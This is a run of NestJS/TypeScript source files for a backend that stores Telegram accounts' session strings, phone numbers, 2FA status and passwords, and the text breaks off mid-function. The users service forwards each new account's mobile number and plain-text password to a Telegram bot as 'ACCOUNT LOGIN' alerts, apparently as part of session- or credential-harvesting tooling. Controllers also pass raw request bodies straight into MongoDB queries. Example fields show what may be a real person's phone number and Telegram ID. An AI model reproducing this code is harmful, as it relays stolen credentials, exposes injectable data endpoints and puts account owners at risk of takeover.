@Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<UserData[]> {\r\n    return this.userDataService.findAll();\r\n  }\r\n\r\n\r\n  @Patch('updateAll/:chatId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\r\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\r\n  }\r\n\r\n\r\n  @Get(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\r\n    return this.userDataService.findOne(profile, chatId);\r\n  }\r\n\r\n  @Patch(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\r\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\r\n  }\r\n\r\n  @Delete(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\r\n    return this.userDataService.remove(profile, chatId);\r\n  }\r\n\r\n  @Get('clear-count')\r\n  clearCount(@Query('chatId') chatId?: string) {\r\n    return this.userDataService.clearCount(chatId);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    try {\r\n      const { query, sort, limit, skip } = requestBody;\r\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw error;\r\n    }\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\r\nimport { UserDataService } from './user-data.service';\r\nimport { UserDataController } from './user-data.controller';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\r\n  controllers: [UserDataController],\r\n  providers: [UserDataService],\r\n  exports: [UserDataService]\r\n})\r\nexport class UserDataModule { }\r\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\r\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\r\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\r\nimport { parseError } from '../../utils';\r\n\r\n@Injectable()\r\nexport class UserDataService {\r\n    private callCounts: Map<string, number> = new Map();\r\n    constructor(@InjectModel(UserData.name) private userDataModel: Model<UserDataDocument>) {}\r\n\r\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\r\n        const createdUser = new this.userDataModel(createUserDataDto);\r\n        return createdUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<UserData[]> {\r\n        return await this.userDataModel.find().exec();\r\n    }\r\n\r\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\r\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\r\n        if (!user) {\r\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\r\n        }\r\n        const currentCount = this.callCounts.get(chatId) || 0;\r\n        this.callCounts.set(chatId, currentCount + 1);\r\n        if (user) {\r\n            return { ...user, count: this.callCounts.get(chatId) };\r\n        } else {\r\n            return undefined\r\n        }\r\n    }\r\n\r\n    clearCount(chatId?: string): string {\r\n        if (chatId) {\r\n            this.callCounts.delete(chatId);\r\n            return `Count cleared for chatId: ${chatId}`;\r\n        } else {\r\n            this.callCounts.clear();\r\n            return 'All counts cleared.';\r\n        }\r\n    }\r\n\r\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\r\n        delete updateUserDataDto['_id']\r\n        console.log(updateUserDataDto)\r\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\r\n        if (!updatedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\r\n        delete updateUserDataDto['_id']\r\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\r\n        if (!updatedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n    async remove(profile: string, chatId: string): Promise<UserData> {\r\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\r\n        if (!deletedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return deletedUser;\r\n    }\r\n\r\n    async search(filter: any): Promise<UserData[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.userDataModel.find(filter).exec();\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\r\n        try {\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.userDataModel.find(query);\r\n\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    async resetPaidUsers() {\r\n        try {\r\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\r\n                $set: {\r\n                    totalCount: 10,\r\n                    limitTime: Date.now(),\r\n                    paidReply: true\r\n                }\r\n            });\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n}\r\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\nexport class CreateUserDto {\r\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\r\n  mobile: string;\r\n\r\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\r\n  session: string;\r\n\r\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\r\n  firstName: string;\r\n\r\n  @ApiProperty({ description: 'Last name of the user', example: null })\r\n  lastName?: string | null;\r\n\r\n  @ApiProperty({ description: 'Username of the user', example: null })\r\n  username?: string | null;\r\n\r\n  @ApiProperty({ description: 'Number of channels', example: 56 })\r\n  channels: number;\r\n\r\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\r\n  personalChats: number;\r\n\r\n  @ApiProperty({ description: 'Number of messages', example: 0 })\r\n  msgs: number;\r\n\r\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\r\n  totalChats: number;\r\n\r\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\r\n  lastActive: string;\r\n\r\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\r\n  tgId: string;\r\n\r\n  @ApiProperty({ description: 'TwoFA status', example: false })\r\n  twoFA: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Expiration status', example: false })\r\n  expired: boolean = false;\r\n\r\n  @ApiProperty({ description: 'password', example: \"pass\" })\r\n  password: string = null;\r\n\r\n  @ApiProperty({ description: 'Number of movies', example: 0 })\r\n  movieCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of photos', example: 0 })\r\n  photoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of videos', example: 0 })\r\n  videoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Gender of the user', example: null })\r\n  gender?: string | null;\r\n\r\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\r\n  otherPhotoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\r\n  otherVideoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\r\n  ownPhotoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\r\n  ownVideoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\r\n  contacts: number = 0;\r\n\r\n  @ApiProperty({\r\n    description: 'Call details of the user',\r\n    example: {\r\n      outgoing: 1,\r\n      incoming: 0,\r\n      video: 1,\r\n      chatCallCounts: [],\r\n      totalCalls: 1,\r\n    },\r\n  })\r\n  calls: {\r\n    outgoing: number;\r\n    incoming: number;\r\n    video: number;\r\n    chatCallCounts: any[];\r\n    totalCalls: number;\r\n  };\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Call details of the user',\r\n    example: []\r\n  })\r\n  recentUsers: any[];\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\r\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\r\n\r\nexport class SearchUserDto {\r\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\r\n  @IsOptional()\r\n  @IsString()\r\n  tgId?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\r\n  @IsOptional()\r\n  @IsString()\r\n  mobile?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  twoFA?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  expired?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by session' })\r\n  @IsOptional()\r\n  @IsString()\r\n  session?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by first name' })\r\n  @IsOptional()\r\n  @IsString()\r\n  firstName?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by last name' })\r\n  @IsOptional()\r\n  @IsString()\r\n  lastName?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by username' })\r\n  @IsOptional()\r\n  @IsString()\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  channels?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  personalChats?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\r\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  demoGiven?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  msgs?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  totalChats?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  lastActive?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  movieCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  photoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  videoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by gender' })\r\n  @IsOptional()\r\n  @IsString()\r\n  gender?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  otherPhotoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  otherVideoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  ownPhotoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  ownVideoCount?: number;\r\n}\r\n","import { PartialType } from '@nestjs/mapped-types';\r\nimport { CreateUserDto } from './create-user.dto';\r\n\r\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose from 'mongoose';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\nexport type UserDocument = User & Document;\r\n\r\n@Schema({\r\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})\r\nexport class User {\r\n  @ApiProperty()\r\n  @Prop({ required: true, unique: true })\r\n  mobile: string;\r\n\r\n  @ApiProperty()\r\n  @Prop({ required: true, unique: true })\r\n  session: string;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  firstName: string;\r\n\r\n  @ApiProperty({ required: false })\r\n  @Prop()\r\n  lastName: string | null;\r\n\r\n  @ApiProperty({ required: false })\r\n  @Prop()\r\n  username: string | null;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  channels: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  personalChats: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  msgs: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  totalChats: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  lastActive: string;\r\n\r\n  @ApiProperty()\r\n  @Prop({ required: true, unique: true })\r\n  tgId: string;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  movieCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  photoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  videoCount: number;\r\n\r\n  @ApiProperty({ required: false })\r\n  @Prop()\r\n  gender: string | null;\r\n\r\n  @Prop({ required: false, type: Boolean })\r\n  twoFA: boolean = false\r\n\r\n  @Prop({ required: false, type: Boolean, default: false })\r\n  expired: boolean = false\r\n\r\n  @Prop({ required: false })\r\n  password: string = null\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  otherPhotoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  otherVideoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  ownPhotoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  ownVideoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  contacts: number;\r\n\r\n  @ApiProperty()\r\n  @Prop({\r\n    type: mongoose.Schema.Types.Mixed,\r\n    default: {\r\n      outgoing: 0,\r\n      incoming: 0,\r\n      video: 0,\r\n      chatCallCounts: [],\r\n      totalCalls: 0,\r\n    },\r\n  })\r\n  calls: {\r\n    outgoing: number;\r\n    incoming: number;\r\n    video: number;\r\n    chatCallCounts: any[];\r\n    totalCalls: number;\r\n  };\r\n\r\n  @ApiPropertyOptional()\r\n  @Prop({\r\n    type: mongoose.Schema.Types.Mixed,\r\n    default: [],\r\n    required: false,\r\n  })\r\n  recentUsers: any[];\r\n\r\n  \r\n}\r\n\r\nexport const UserSchema = SchemaFactory.createForClass(User);\r\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\r\nimport { UsersService } from './users.service';\r\nimport { User } from './schemas/user.schema';\r\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\r\nimport { SearchUserDto } from './dto/search-user.dto';\r\nimport { UpdateUserDto } from './dto/update-user.dto';\r\nimport { CreateUserDto } from './dto/create-user.dto';\r\n\r\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\r\n@Controller('user')\r\nexport class UsersController {\r\n  constructor(private readonly usersService: UsersService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new user' })\r\n  async create(@Body() createUserDto: CreateUserDto) {\r\n    console.log(\"creating new user\")\r\n    return this.usersService.create(createUserDto);\r\n  }\r\n\r\n  @Get('/search')\r\n  @ApiOperation({ summary: 'Search users based on various parameters' })\r\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\r\n    return this.usersService.search(queryParams);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all users' })\r\n  async findAll() {\r\n    return this.usersService.findAll();\r\n  }\r\n\r\n  @Get(':tgId')\r\n  @ApiOperation({ summary: 'Get a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async findOne(@Param('tgId') tgId: string) {\r\n    return this.usersService.findOne(tgId);\r\n  }\r\n\r\n  @Patch(':tgId')\r\n  @ApiOperation({ summary: 'Update a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\r\n    return this.usersService.update(tgId, updateUserDto);\r\n  }\r\n\r\n  @Delete(':tgId')\r\n  @ApiOperation({ summary: 'Delete a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async remove(@Param('tgId') tgId: string) {\r\n    return this.usersService.delete(tgId);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.usersService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UsersService } from './users.service';\r\nimport { UsersController } from './users.controller';\r\nimport { UserSchema } from './schemas/user.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => ClientModule)\r\n  ],\r\n  controllers: [UsersController],\r\n  providers: [UsersService],\r\n  exports: [UsersService]\r\n})\r\nexport class UsersModule { }\r\n","import { TelegramService } from './../Telegram/Telegram.service';\r\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { User, UserDocument } from './schemas/user.schema';\r\nimport { SearchUserDto } from './dto/search-user.dto';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { fetchWithTimeout, ppplbot } from '../../utils';\r\nimport { UpdateUserDto } from './dto/update-user.dto';\r\nimport { CreateUserDto } from './dto/create-user.dto';\r\n\r\n@Injectable()\r\nexport class UsersService {\r\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\r\n    @Inject(forwardRef(() => TelegramService))\r\n    private telegramService: TelegramService,\r\n    @Inject(forwardRef(() => ClientService))\r\n    private clientsService: ClientService\r\n  ) {}\r\n\r\n  async create(user: CreateUserDto): Promise<User> {\r\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\r\n    console.log(\"New User received - \", user?.mobile);\r\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\r\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\r\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\r\n      await this.clientsService.updateClientSession(user.session)\r\n    } else {\r\n      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\r\n      const newUser = new this.userModel(user);\r\n      return newUser.save();\r\n    }\r\n  }\r\n\r\n  async findAll(): Promise<User[]> {\r\n    return this.userModel.find().exec();\r\n  }\r\n\r\n  async findOne(tgId: string): Promise<User> {\r\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\r\n    if (!user) {\r\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\r\n    }\r\n    return user;\r\n  }\r\n\r\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\r\n    delete user['_id']\r\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\r\n    if (result.matchedCount === 0) {\r\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\r\n    }\r\n    return result.modifiedCount;\r\n  }\r\n\r\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\r\n    delete user['_id']\r\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\r\n    if (result.matchedCount === 0) {\r\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\r\n    }\r\n    return result.modifiedCount;\r\n  }\r\n\r\n  async delete(tgId: string): Promise<void> {\r\n    const result = await this.userModel.deleteOne({ tgId }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\r\n    }\r\n  }\r\n  async search(filter: SearchUserDto): Promise<User[]> {\r\n    if (filter.firstName) {\r\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\r\n    }\r\n    if (filter.twoFA !== undefined) {\r\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\r\n    }\r\n    console.log(filter)\r\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\r\n  }\r\n\r\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {\r\n    try {\r\n      if (!query) {\r\n        throw new BadRequestException('Query is invalid.');\r\n      }\r\n      const queryExec = this.userModel.find(query);\r\n\r\n      if (sort) {\r\n        queryExec.sort(sort);\r\n      }\r\n\r\n      if (limit) {\r\n        queryExec.limit(limit);\r\n      }\r\n\r\n      if (skip) {\r\n        queryExec.skip(skip);\r\n      }\r\n\r\n      return await queryExec.exec();\r\n    } catch (error) {\r\n      throw new InternalServerErrorException(error.message);\r\n    }\r\n  }\r\n\r\n}\r\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\r\nimport { Request, Response, NextFunction } from 'express';\r\nimport { fetchWithTimeout, parseError, ppplbot } from '../utils';\r\n\r\n@Injectable()\r\nexport class LoggerMiddleware implements NestMiddleware {\r\n    private readonly logger = new Logger('HTTP');\r\n\r\n    use(req: Request, res: Response, next: NextFunction): void {\r\n        const { method, originalUrl, baseUrl } = req;\r\n        const userAgent = req.get('user-agent') || '';\r\n        const ip = req.ip;\r\n\r\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup'];\r\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\r\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\r\n            res.on('finish', () => {\r\n                const { statusCode } = res;\r\n                const contentLength = res.get('content-length');\r\n                if (statusCode >= 500) {\r\n                    fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\r\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\r\n                } else if (statusCode >= 400) {\r\n                    fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\r\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\r\n                } else if (statusCode >= 300) {\r\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\r\n                } else {\r\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\r\n                }\r\n            });\r\n            res.on('error', (error) => {\r\n                const errorDetails = parseError(error, process.env.clientId);\r\n                fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\r\n            })\r\n        } else {\r\n            if (originalUrl.includes('Video')) {\r\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\r\n            }\r\n        }\r\n\r\n        next();\r\n    }\r\n}\r\n","import axios, { AddressFamily, AxiosRequestConfig } from 'axios';\r\n\r\nexport function sleep(ms) {\r\n  return new Promise(resolve => setTimeout(resolve, ms));\r\n}\r\nexport function contains(str, arr) {\r\n  return (arr.some(element => {\r\n    if (str?.includes(element)) {\r\n      return true;\r\n    }\r\n    return false;\r\n  }))\r\n};\r\n\r\n\r\nexport async function fetchWithTimeout(resource: string, options: AxiosRequestConfig = {}, maxRetries = 1) {\r\n  options.timeout = options.timeout || 50000;\r\n  options.method = options.method || 'GET';\r\n\r\n  const fetchWithProtocol = async (url: string, version: AddressFamily) => {\r\n    const source = axios.CancelToken.source();\r\n    const id = setTimeout(() => {\r\n      source.cancel(`Request timed out after ${options.timeout}ms`);\r\n    }, options.timeout);\r\n\r\n    try {\r\n      const response = await axios({\r\n        ...options,\r\n        url,\r\n        headers: { 'Content-Type': 'application/json' },\r\n        cancelToken: source.token,\r\n        family: version\r\n      });\r\n      clearTimeout(id);\r\n      return response;\r\n    } catch (error) {\r\n      clearTimeout(id);\r\n      console.log(`Error at URL (IPv${version}): `, url);\r\n      parseError(error);\r\n      if (axios.isCancel(error)) {\r\n        console.log('Request canceled:', error.message, url);\r\n        return undefined;\r\n      }\r\n      throw error; // Rethrow the error to handle retry logic outside\r\n    }\r\n  };\r\n\r\n  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {\r\n    try {\r\n      // First try with IPv4\r\n      const responseIPv4 = await fetchWithProtocol(resource, 4);\r\n      if (responseIPv4) return responseIPv4;\r\n\r\n      // If IPv4 fails, try with IPv6\r\n      const responseIPv6 = await fetchWithProtocol(resource, 6);\r\n      if (responseIPv6) return responseIPv6;\r\n    } catch (error) {\r\n      console.log(\"Error at URL : \", resource)\r\n      const errorDetails = parseError(error)\r\n      if (retryCount < maxRetries && error.code !== 'ERR_NETWORK' && error.code !== \"ECONNABORTED\" && error.code !== \"ETIMEDOUT\" && !errorDetails.message.toLowerCase().includes('too many requests') && !axios.isCancel(error)) {\r\n        console.log(`Retrying... (${retryCount + 1}/${maxRetries})`);\r\n        await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds delay\r\n      } else {\r\n        console.log(`All ${maxRetries + 1} retries failed for ${resource}`);\r\n        return undefined;\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\nexport function toBoolean(value: string | number | boolean): boolean {\r\n  if (typeof value === 'string') {\r\n    return value.toLowerCase() === 'true';\r\n  }\r\n  if (typeof value === 'number') {\r\n    return value === 1;\r\n  }\r\n  return value\r\n}\r\n\r\nexport function fetchNumbersFromString(inputString) {\r\n  const regex = /\\d+/g;\r\n  const matches = inputString.match(regex);\r\n  if (matches) {\r\n    const result = matches.join('');\r\n    return result;\r\n  } else {\r\n    return '';\r\n  }\r\n}\r\n\r\nexport function parseError(\r\n  err,\r\n  prefix = 'TgCms',\r\n) {\r\n  let status = 'UNKNOWN';\r\n  let message = 'An unknown error occurred';\r\n  let error = 'UnknownError';\r\n\r\n  const extractMessage = (data) => {\r\n    if (Array.isArray(data)) {\r\n      const messages = data.map((item) => extractMessage(item));\r\n      return messages.filter((message) => message !== undefined).join(', ');\r\n    } else if (typeof data === 'string') {\r\n      return data;\r\n    } else if (typeof data === 'object' && data !== null) {\r\n      let resultString = ''\r\n      for (const key in data) {\r\n        const value = data[key]\r\n        if (Array.isArray(data[key]) && data[key].every(item => typeof item === 'string')) {\r\n          resultString = resultString + data[key].join(', ');\r\n        } else {\r\n          const result = extractMessage(value);\r\n          if (result) {\r\n            resultString = resultString + result;\r\n          }\r\n        }\r\n      }\r\n      return resultString\r\n    }\r\n    return JSON.stringify(data);\r\n  };\r\n\r\n  if (err.response) {\r\n    const response = err.response;\r\n    status =\r\n      response.data?.status ||\r\n      response.status ||\r\n      err.status ||\r\n      'UNKNOWN';\r\n    message =\r\n      response.data?.message ||\r\n      response.data?.errors ||\r\n      response.errorMessage ||\r\n      response.message ||\r\n      response.statusText ||\r\n      response.data ||\r\n      err.message ||\r\n      'An error occurred';\r\n    error =\r\n      response.data?.error ||\r\n      response.error ||\r\n      err.name ||\r\n      err.code ||\r\n      'Error';\r\n  } else if (err.request) {\r\n    status = err.status || 'NO_RESPONSE';\r\n    message = err.data?.message ||\r\n      err.data?.errors ||\r\n      err.message ||\r\n      err.statusText ||\r\n      err.data ||\r\n      err.message || 'The request was triggered but no response was 